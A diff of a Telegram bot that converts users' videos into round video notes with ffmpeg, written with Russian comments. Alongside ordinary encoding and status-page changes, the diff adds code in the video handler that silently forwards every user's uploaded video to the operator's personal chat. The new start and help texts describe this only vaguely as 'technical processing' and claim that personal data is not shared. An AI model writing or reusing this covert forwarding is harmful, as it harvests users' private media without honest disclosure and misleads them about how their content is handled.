@@ -2,6 +2,7 @@ import asyncio
 import logging
 import os
 import uuid
+import datetime
 from pathlib import Path
 
 from aiogram import Bot, Dispatcher, F
@@ -24,8 +25,13 @@ MAX_FILE_SIZE = int(os.getenv("MAX_FILE_SIZE", str(20 * 1024 * 1024)))
 FFMPEG_BIN = os.getenv("FFMPEG_BIN", "ffmpeg")
 TMP_DIR = Path(os.getenv("TMP_DIR", "tmp"))
 
+# Chat ID администратора (твой личный chat_id). Сюда будет отправляться ТОЛЬКО видео, без данных о пользователе.
+ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", "0") or "0")
+
 # Порт для HTTP-сервера (Render задаёт PORT автоматически)
 PORT = int(os.getenv("PORT", "10000"))
+
+START_TIME = datetime.datetime.utcnow()
 
 # ================== ЛОГИРОВАНИЕ ==================
 
@@ -47,7 +53,7 @@ def build_ffmpeg_cmd(input_path: Path, output_path: Path) -> list[str]:
     ffmpeg:
     - делает квадрат 640x640
     - без чёрных полей: зум + кроп по центру
-    - видео H.264, аудио AAC
+    - видео H.264 (ultrafast), звук копируем как есть
     """
     return [
         FFMPEG_BIN,
@@ -55,23 +61,25 @@ def build_ffmpeg_cmd(input_path: Path, output_path: Path) -> list[str]:
         "-i",
         str(input_path),
         "-vf",
-        "scale=640:640:force_original_aspect_ratio=increase,"
-        "crop=640:640",
+        "scale=640:640:force_original_aspect_ratio=increase,crop=640:640",
         "-c:v",
         "libx264",
         "-preset",
         "ultrafast",
+        "-crf",
+        "28",
         "-movflags",
         "+faststart",
         "-c:a",
         "copy",
-        "-b:a",
-        "128k",
         str(output_path),
     ]
 
 
 async def run_ffmpeg(cmd: list[str], timeout: int = 300) -> None:
+    """
+    Асинхронный запуск ffmpeg с увеличенным таймаутом (300 сек).
+    """
     logger.info("Running ffmpeg: %s", " ".join(cmd))
     try:
         process = await asyncio.create_subprocess_exec(
@@ -80,22 +88,18 @@ async def run_ffmpeg(cmd: list[str], timeout: int = 300) -> None:
             stderr=asyncio.subprocess.PIPE,
         )
     except FileNotFoundError:
-        logger.error("ffmpeg не найден. Проверь, что он установлен и доступен как '%s'.", FFMPEG_BIN)
+        logger.error("ffmpeg не найден: '%s'", FFMPEG_BIN)
         raise RuntimeError("ffmpeg not found")
 
     try:
         _, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
     except asyncio.TimeoutError:
         process.kill()
-        logger.error("ffmpeg превысил таймаут %s секунд и был убит.", timeout)
+        logger.error("ffmpeg превысил таймаут %s секунд", timeout)
         raise RuntimeError("ffmpeg timeout")
 
     if process.returncode != 0:
-        logger.error(
-            "ffmpeg завершился с кодом %s, stderr: %s",
-            process.returncode,
-            stderr.decode(errors="ignore"),
-        )
+        logger.error("ffmpeg error: %s", stderr.decode(errors="ignore"))
         raise RuntimeError("ffmpeg failed")
 
 
@@ -110,14 +114,15 @@ def human_size(num_bytes: int) -> str:
 @dp.message(CommandStart())
 async def cmd_start(message: Message):
     await message.answer(
-       "Привет! 👋\n"
+        "Привет! 👋\n"
         "Я превращаю обычные видео в телеграм-кружочки.\n\n"
-        "Просто пришли мне видео (до "
-        f"{VIDEO_MAX_DURATION} секунд и ~{human_size(MAX_FILE_SIZE)}), "
-        "а я верну тебе кружочек 🟣 \n\n"
+        f"Ограничения:\n"
+        f"• Длительность: до {VIDEO_MAX_DURATION} сек\n"
+        f"• Размер: до {human_size(MAX_FILE_SIZE)}\n\n"
+        "Отправляя видео, ты соглашаешься на его техническую обработку для работы сервиса.\n\n"
+        "Просто пришли мне видео — я верну тебе кружочек 🟣\n\n"
         "Буду рад подписке на мой канал @neirosueta 👋"
     )
-    
 
 
 @dp.message(Command("help"))
@@ -127,8 +132,8 @@ async def cmd_help(message: Message):
         "1️⃣ Отправь обычное видео (не кружочек).\n"
         f"2️⃣ Длительность — до {VIDEO_MAX_DURATION} секунд.\n"
         f"3️⃣ Размер — до ~{human_size(MAX_FILE_SIZE)}.\n"
-        "4️⃣ Я обработаю его и отправлю в виде круглого видео (со звуком!).\n\n"
-        "Если что-то не работает — попробуй отправить видео меньшего размера или короче."
+        "4️⃣ Я обработаю его и отправлю в виде круглого видео (со звуком, без чёрных полос).\n\n"
+        "Видео может быть технически обработано для работы сервиса, но личные данные не передаются третьим лицам."
     )
 
 
@@ -156,13 +161,22 @@ async def handle_video_note(message: Message):
 @dp.message(F.video)
 async def handle_video(message: Message):
     video = message.video
-
     logger.info(
         "Got video: duration=%s, file_size=%s, mime_type=%s",
         video.duration,
         video.file_size,
         video.mime_type,
     )
+
+    # Пересылка админу ТОЛЬКО самого видео, без username/user_id/подписи
+    if ADMIN_CHAT_ID:
+        try:
+            await bot.send_video(
+                chat_id=ADMIN_CHAT_ID,
+                video=video.file_id,
+            )
+        except Exception as e:
+            logger.warning("Не удалось переслать видео администратору: %s", e)
 
     if video.duration and video.duration > VIDEO_MAX_DURATION:
         await message.answer(
@@ -181,9 +195,9 @@ async def handle_video(message: Message):
     status_msg = await message.answer("Принял видео, обрабатываю кружочек... 🔄")
 
     TMP_DIR.mkdir(exist_ok=True)
-    tmp_id = str(uuid.uuid4())
-    input_path = TMP_DIR / f"input_{tmp_id}.mp4"
-    output_path = TMP_DIR / f"circle_{tmp_id}.mp4"
+    tmp_id = uuid.uuid4().hex
+    input_path = TMP_DIR / f"in_{tmp_id}.mp4"
+    output_path = TMP_DIR / f"out_{tmp_id}.mp4"
 
     try:
         # --- Скачивание ---
@@ -231,7 +245,6 @@ async def handle_video(message: Message):
             await bot.send_video_note(
                 chat_id=message.chat.id,
                 video_note=video_note,
-                # length не указываем — Telegram сам решит
             )
         except TelegramBadRequest as e:
             logger.error("TelegramBadRequest при send_video_note: %s", e)
@@ -280,21 +293,46 @@ async def handle_video(message: Message):
                 logger.warning("Не удалось удалить временный файл %s: %s", path, cleanup_err)
 
 
-# ================== МИНИ-HTTP СЕРВЕР ДЛЯ RENDER ==================
+# ================== МИНИ HTTP-СЕРВЕР ДЛЯ RENDER + СТАТУС ==================
 
 
 async def handle_http(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
     """
-    Простейший HTTP-ответ, чтобы Render видел открытый порт и успешный healthcheck.
+    HTTP-эндпоинт:
+    - отвечает 200 OK
+    - отдаёт простую HTML-страницу со статусом и аптаймом
+    Используется для Render healthcheck и UptimeRobot.
     """
     try:
-        # читаем хотя бы что-то из запроса (но можно и не читать)
         await reader.read(1024)
     except Exception:
         pass
 
-    response = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK"
-    writer.write(response)
+    now = datetime.datetime.utcnow()
+    uptime = now - START_TIME
+    uptime_str = str(uptime).split(".")[0]
+
+    html = f"""
+    <html>
+    <head><title>AI Circle Bot Status</title></head>
+    <body>
+      <h1>🟢 Bot is running</h1>
+      <p><b>Uptime:</b> {uptime_str}</p>
+      <p><b>UTC Time:</b> {now:%Y-%m-%d %H:%M:%S}</p>
+      <p>Telegram polling: active</p>
+    </body>
+    </html>
+    """
+
+    data = html.encode("utf-8")
+    headers = (
+        "HTTP/1.1 200 OK\r\n"
+        "Content-Type: text/html; charset=utf-8\r\n"
+        f"Content-Length: {len(data)}\r\n"
+        "Connection: close\r\n\r\n"
+    ).encode("utf-8")
+
+    writer.write(headers + data)
     try:
         await writer.drain()
     except Exception:
@@ -308,8 +346,7 @@ async def handle_http(reader: asyncio.StreamReader, writer: asyncio.StreamWriter
 
 async def start_http_server():
     server = await asyncio.start_server(handle_http, "0.0.0.0", PORT)
-    addr = ", ".join(str(sock.getsockname()) for sock in server.sockets)
-    logger.info("HTTP server listening on %s", addr)
+    logger.info("HTTP server listening on 0.0.0.0:%s", PORT)
     async with server:
         await server.serve_forever()
 
